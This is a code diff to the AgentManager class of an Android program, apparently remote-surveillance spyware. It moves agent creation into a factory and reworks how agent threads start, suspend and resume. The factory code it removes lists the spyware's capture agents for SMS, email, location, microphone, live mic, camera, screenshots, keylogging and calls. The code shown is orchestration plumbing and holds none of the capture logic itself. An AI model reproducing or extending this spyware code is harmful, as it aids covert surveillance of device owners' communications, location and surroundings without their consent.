@@ -15,13 +15,14 @@ import android.util.Log;
 import com.ht.RCSAndroidGUI.Manager;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.conf.Configuration;
+import com.ht.RCSAndroidGUI.interfaces.AbstractFactory;
 import com.ht.RCSAndroidGUI.util.Check;
 
 // TODO: Auto-generated Javadoc
 /**
  * The Class AgentManager.
  */
-public class AgentManager extends Manager<AgentBase, AgentType> {
+public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
 
 	/** The Constant TAG. */
 	private static final String TAG = "AgentManager";
@@ -39,101 +40,12 @@ public class AgentManager extends Manager<AgentBase, AgentType> {
 			synchronized (AgentManager.class) {
 				if (singleton == null) {
 					singleton = new AgentManager();
+					singleton.setFactory(new AgentFactory());
 				}
 			}
 		}
 
 		return singleton;
-	}
-
-	/**
-	 * mapAgent() Add agent id defined by "key" into the running map. If the
-	 * agent is already present, the old object is returned.
-	 * 
-	 * @param key
-	 *            : Agent ID
-	 * @return the requested agent or null in case of error
-	 */
-	private AgentBase factory(AgentType type) {
-		AgentBase a = null;
-
-		if (running.containsKey(type) == true) {
-			return running.get(type);
-		}
-
-		switch (type) {
-		case AGENT_SMS:
-			a = new MessageAgent();
-			break;
-
-		case AGENT_TASK:
-			break;
-
-		case AGENT_CALLLIST:
-			break;
-
-		case AGENT_DEVICE:
-			a = new DeviceAgent();
-			break;
-
-		case AGENT_POSITION:
-			a = new PositionAgent();
-			break;
-
-		case AGENT_CALL:
-			break;
-
-		case AGENT_CALL_LOCAL:
-			break;
-
-		case AGENT_KEYLOG:
-			break;
-
-		case AGENT_SNAPSHOT:
-			a = new SnapshotAgent();
-			break;
-
-		case AGENT_URL:
-			break;
-
-		case AGENT_IM:
-			break;
-
-		case AGENT_EMAIL:
-			a = new MessageAgent();
-			break;
-
-		case AGENT_MIC:
-			a = new MicAgent();
-			break;
-
-		case AGENT_CAM:
-			a = new CameraAgent();
-			break;
-
-		case AGENT_CLIPBOARD:
-			break;
-
-		case AGENT_CRISIS:
-			a = new CrisisAgent();
-			break;
-
-		case AGENT_APPLICATION:
-			break;
-			
-		case AGENT_LIVEMIC:
-			break;
-
-		default:
-			Log.d("QZ", TAG + " Error (factory): unknown type");
-			break;
-		}
-
-		if (a != null) {
-			running.put(type, a);
-		}
-
-		return a;
 	}
 
 	/**
@@ -161,7 +73,7 @@ public class AgentManager extends Manager<AgentBase, AgentType> {
 			final AgentType key = it.next();
 			Check.asserts(key != null, "null type");
 			AgentConf conf = agents.get(key);
-			if(conf.isEnabled()){
+			if (conf.isEnabled()) {
 				start(key);
 			}
 		}
@@ -182,10 +94,10 @@ public class AgentManager extends Manager<AgentBase, AgentType> {
 			final AgentType key = it.next();
 			stop(key);
 		}
-		
+
 		Check.ensures(threads.size() == 0, "Non empty threads");
 		Check.ensures(running.size() == 0, "Non empty running");
-		
+
 		running.clear();
 		threads.clear();
 	}
@@ -211,7 +123,7 @@ public class AgentManager extends Manager<AgentBase, AgentType> {
 			return;
 		}
 
-		AgentBase a = factory(key);
+		AgentBase a = makeAgent(key);
 
 		if (a == null) {
 			return;
@@ -227,21 +139,35 @@ public class AgentManager extends Manager<AgentBase, AgentType> {
 		// so unmap and restart the thread
 		if (a.getStatus() == AgentConf.AGENT_STOPPED) {
 			// running.remove(key);
-			a = factory(key);
+			a = makeAgent(key);
 		}
 
 		Check.asserts(a != null, "null agent");
 		Check.asserts(running.get(key) != null, "null running");
 
-		a.parse(agents.get(key).getParams());
+		a.parse(agents.get(key));
 
 		final Thread t = new Thread(a);
-		if(Configuration.DEBUG){
+		if (Configuration.DEBUG) {
 			t.setName(a.getClass().getSimpleName());
 		}
 		threads.put(a, t);
 		t.start();
 
+	}
+
+	private AgentBase makeAgent(AgentType type) {
+		if (running.containsKey(type) == true) {
+			return running.get(type);
+		}
+
+		AgentBase base = factory.create(type);
+
+		if (base != null) {
+			running.put(type, base);
+		}
+
+		return base;
 	}
 
 	/**
@@ -278,17 +204,20 @@ public class AgentManager extends Manager<AgentBase, AgentType> {
 	 * @param key
 	 *            the key
 	 */
-	public void suspend(int key) {
+	private void suspend(int key) {
 		final AgentBase a = running.get(key);
 		if (a == null) {
 			Log.d("QZ", TAG + " Agent " + key + " not present");
 			return;
 		}
+		suspend(a);
+	}
 
+	public void suspend(AgentBase agent) {
 		// suspending a thread implies a stop
-		a.suspend();
+		agent.suspend();
 
-		final Thread t = threads.get(a);
+		final Thread t = threads.get(agent);
 		if (t != null) {
 			try {
 				t.join();
@@ -297,7 +226,7 @@ public class AgentManager extends Manager<AgentBase, AgentType> {
 				e.printStackTrace();
 			}
 		}
-		threads.remove(a);
+		threads.remove(agent);
 
 	}
 
@@ -307,20 +236,25 @@ public class AgentManager extends Manager<AgentBase, AgentType> {
 	 * @param key
 	 *            the key
 	 */
-	public void resume(int key) {
+	private void resume(int key) {
 		final AgentBase a = running.get(key);
 		if (a == null) {
 			Log.d("QZ", TAG + " Agent " + key + " not present");
 			return;
 		}
 
-		if (a.isSuspended()) {
+		resume(a);
+	}
+
+	public void resume(AgentBase agent) {
+
+		if (agent.isSuspended()) {
 			// this clean the suspendend status
-			a.resume();
+			agent.resume();
 
 			// start a new thread and restart the loop.
-			final Thread t = new Thread(a);
-			threads.put(a, t);
+			final Thread t = new Thread(agent);
+			threads.put(agent, t);
 			t.start();
 
 		}
